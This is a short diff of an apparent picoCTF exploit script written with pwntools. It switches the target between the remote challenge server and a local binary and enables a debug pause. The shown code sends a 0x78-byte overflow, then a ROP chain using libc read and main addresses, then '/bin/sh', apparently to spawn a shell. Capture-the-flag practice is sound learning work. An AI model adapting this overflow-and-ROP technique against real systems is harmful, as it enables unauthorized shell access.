@@ -1,8 +1,8 @@
 from pwn import *
 import random
 
-# r = process("./vuln")
-r = remote("jupiter.challenges.picoctf.org", 39940)
+r = process("./vuln")
+# r = remote("jupiter.challenges.picoctf.org", 39940)
 
 context.arch = "amd64"
 
@@ -38,7 +38,7 @@ ROP_payload = flat(
     libc_read_addr,
     main_fun_addr
 )
-# raw_input()
+raw_input()
 r.sendline(b'a' * 0x78 + ROP_payload)
 r.sendline(b'/bin/sh\x00')
 
